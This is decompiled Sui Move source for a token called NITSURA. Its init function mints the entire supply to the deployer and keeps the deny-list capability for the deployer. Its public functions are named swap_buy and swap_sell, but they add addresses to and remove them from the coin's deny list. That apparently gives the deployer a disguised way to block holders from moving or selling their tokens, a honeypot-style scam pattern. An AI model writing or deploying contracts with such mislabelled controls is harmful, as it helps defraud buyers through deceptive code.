module 0x713b0d6763356c5dcca8374f791ebf3706454b339ef3b92dceb9939c07fb940a::nitsura {
    struct NITSURA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NITSURA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NITSURA>(arg0, 9, b"NITSURA", b"NITSURA", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmV54AJibaxYjhouRPnhW58kPdxNpfULz55SVcUJf1R4vP"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NITSURA>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NITSURA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NITSURA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NITSURA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NITSURA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NITSURA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NITSURA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NITSURA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

